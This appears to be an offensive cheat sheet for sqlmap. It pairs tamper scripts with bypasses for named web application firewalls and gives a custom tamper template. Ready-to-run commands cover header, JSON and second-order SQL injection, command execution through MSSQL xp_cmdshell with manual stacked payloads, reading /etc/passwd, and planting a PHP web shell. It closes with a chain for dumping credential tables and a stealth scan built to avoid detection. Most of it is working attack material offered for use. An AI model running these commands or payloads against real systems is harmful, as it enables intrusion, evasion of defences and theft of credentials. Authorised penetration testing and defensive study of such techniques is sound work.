# sqlmap — Tamper Scripts, WAF Bypass & Advanced Injection

## WAF Detection & Bypass Strategy

```bash
# Step 1: Identify WAF
sqlmap -u "http://target.com/page?id=1" --identify-waf
# Or: wafw00f http://target.com

# Step 2: Select tampers for detected WAF
# Step 3: Test with low level/risk first, increase if needed
# Step 4: Combine tampers

# Common WAF → Tamper combinations:
# ModSecurity: space2comment,between,randomcase
# Cloudflare: charunicodeencode,space2plus,percentage
# F5 BIG-IP: space2comment,charencode
# Sucuri: between,randomcase,space2comment
# AWS WAF: charunicodeencode,between
```

## Tamper Scripts Reference

### Encoding / Obfuscation

| Script | Input → Output |
|--------|---------------|
| `charencode` | `SELECT` → `%53%45%4c%45%43%54` |
| `charunicodeencode` | `SELECT` → `%u0053%u0045...` |
| `base64encode` | payload → base64 string |
| `hexencode` | `SELECT` → `0x53454c454354` |
| `apostrophemask` | `'` → `ï¼‡` (UTF-8 fullwidth) |
| `apostrophenullencode` | `'` → `%00'` |
| `percentage` | `SELECT` → `%S%E%L%E%C%T` (IIS) |

### Keyword Replacement

| Script | Input → Output |
|--------|---------------|
| `space2comment` | `SELECT id FROM` → `SELECT/**/id/**/FROM` |
| `space2plus` | space → `+` |
| `space2dash` | space → `--\nspace` |
| `space2hash` | space → `#\n` (MySQL) |
| `space2morehash` | space → `#xyz\nspace` |
| `space2mssqlblank` | space → random blank char |
| `randomcase` | `SELECT` → `SeLeCt` |
| `equaltolike` | `=` → `LIKE` |
| `greatest` | `>` → `GREATEST(x,y)` |
| `between` | `>` → `NOT BETWEEN 0 AND` |
| `ifnull2ifisnull` | `IFNULL` → `IF(ISNULL(...),...)` |
| `concat2concatws` | `CONCAT` → `CONCAT_WS` |

### Comment Variations

| Script | Effect |
|--------|--------|
| `versionedkeywords` | `/*!SELECT*/` — MySQL versioned comments |
| `modsecurityversioned` | Versioned MySQL comments |
| `modsecurityzeroversioned` | Version 0 comments |
| `halfversionedmorekeywords` | After each keyword: `/*!0` |

### Special Techniques

| Script | Effect |
|--------|--------|
| `bluecoat` | Random whitespace after SQL keywords |
| `bypasswaf` | Mix of techniques for generic WAF bypass |
| `dunno` | Replace `NULL` with `NOT NULL` counterpart |
| `escapequotes` | Slash escape quotes |
| `overlongutf8` | Overlong UTF-8 encoding |
| `symboliclogical` | Replace AND/OR with symbols `&&`/`||` |
| `unmagicquotes` | Wide char bypass for magic_quotes_gpc |
| `unionalltounion` | `UNION ALL SELECT` → `UNION SELECT` |
| `multiplespaces` | Multiple spaces between keywords |
| `randomcomments` | Insert random comments inside keywords (`SE/**/LECT`) |
| `nonrecursivereplacement` | Double keywords for naive string-replace filters |
| `sp_password` | Append `sp_password` to hide queries in MSSQL audit logs |
| `luanginxmore` | Adds ~4.2M junk POST params — Lua/Nginx (Cloudflare) bypass |
| `xforwardedfor` | Add `X-Forwarded-For: 127.0.0.1` header |
| `varnish` | Add `X-originating-IP` header |

## Recommended Stacks by WAF

| WAF | Tamper Stack |
|-----|-------------|
| Cloudflare | `space2comment,randomcase,charencode,between` |
| ModSecurity CRS | `space2comment,modsecurityversioned,randomcase` |
| AWS WAF | `charunicodeencode,between,randomcase` |
| F5 BIG-IP | `space2comment,charencode` |
| Sucuri | `between,randomcase,space2comment` |
| Nginx/Lua | `luanginxmore` (standalone) |
| MSSQL targets | `sp_password,percentage,charencode` |
| Generic/unknown | `between,randomcase,space2comment` |

## Custom Tamper Script

```python
# Minimal tamper script template
# Save as: sqlmap/tamper/mycustom.py
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """Transform payload before sending"""
    return payload.replace("SELECT", "SE/**/LECT")
```

```bash
# Use custom tamper
sqlmap -r req.txt --tamper=mycustom
```

## Advanced Injection Scenarios

### Second-Order SQL Injection

```bash
# Data injected in step 1 is stored and executed in step 2
# Example: register username → displayed in profile page

# Step 1: register endpoint
# Step 2: profile endpoint that triggers the injection

sqlmap -u "http://target.com/register" \
    --data="username=INJECT&email=a@b.com" \
    --second-url="http://target.com/profile/view" \
    --batch --dbs
```

### JSON / XML Body Injection

```bash
# JSON POST:
sqlmap -u "http://target.com/api/v1/search" \
    --data='{"query": "test", "filter": {"id": "1*"}}' \
    --headers="Content-Type: application/json" \
    --batch --dbs

# XML body:
sqlmap -u "http://target.com/api/search" \
    --data='<?xml version="1.0"?><root><id>1*</id></root>' \
    --headers="Content-Type: text/xml" \
    --batch

# GraphQL:
sqlmap -u "http://target.com/graphql" \
    --data='{"query": "{ user(id: \"1*\") { name } }"}' \
    --headers="Content-Type: application/json" \
    --batch
```

### Injection in HTTP Headers

```bash
# Manually mark injection point with asterisk:
sqlmap -u "http://target.com/" \
    --headers="X-Forwarded-For: 127.0.0.1*" \
    --batch --level=3

# User-Agent injection:
sqlmap -u "http://target.com/" \
    --headers="User-Agent: Mozilla/5.0*" \
    --batch --level=5

# Cookie value injection:
sqlmap -u "http://target.com/" \
    --cookie="auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9*" \
    --batch --level=2
```

### Stacked Queries (RCE via xp_cmdshell)

```bash
# MSSQL: enable xp_cmdshell
sqlmap -u "http://target.com/page?id=1" \
    --dbms=mssql \
    --technique=S \
    --os-shell
# sqlmap automatically enables xp_cmdshell via EXEC sp_configure

# Manual stacked query:
1; EXEC master..xp_cmdshell 'whoami'--
1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

### MySQL File Operations

```bash
# Read arbitrary files (requires FILE privilege):
sqlmap -u "http://target.com/page?id=1" \
    --file-read=/etc/passwd

# Write webshell:
echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > /tmp/shell.php
sqlmap -u "http://target.com/page?id=1" \
    --file-write=/tmp/shell.php \
    --file-dest=/var/www/html/uploads/shell.php

# Verify web root from SQL:
# @@datadir → mysql data directory → infer web root
# Information from phpinfo(), error messages, etc.
```

## Output Processing

```bash
# sqlmap stores results in ~/.local/share/sqlmap/output/<target>/
ls ~/.local/share/sqlmap/output/target.com/

# Files:
# dump/ → dumped tables (CSV)
# log → full request/response log
# session.sqlite → injection session (auto-resume)
# target.txt → injection details

# Resume interrupted session:
sqlmap -r request.txt --batch --resume

# Parse dump CSV:
cat ~/.local/share/sqlmap/output/target.com/dump/target_db/users.csv
```

## Useful Combinations

```bash
# Quick exploitation chain (find vuln → dump credentials):
sqlmap -r request.txt --batch \
    --technique=BEUST \
    --current-db \
    --tables \
    --dump -D target_db -T users -C "username,password" \
    --threads=5

# Stealth scan (slow, avoid detection):
sqlmap -r request.txt \
    --delay=2 \
    --randomize=id \
    --random-agent \
    --tamper=space2comment,randomcase \
    --level=1 --risk=1

# Force UNION-based (fastest when applicable):
sqlmap -u "http://target.com/page?id=1" \
    --technique=U \
    --union-cols=5 \      # if columns count known
    --dump -D mydb -T users
```
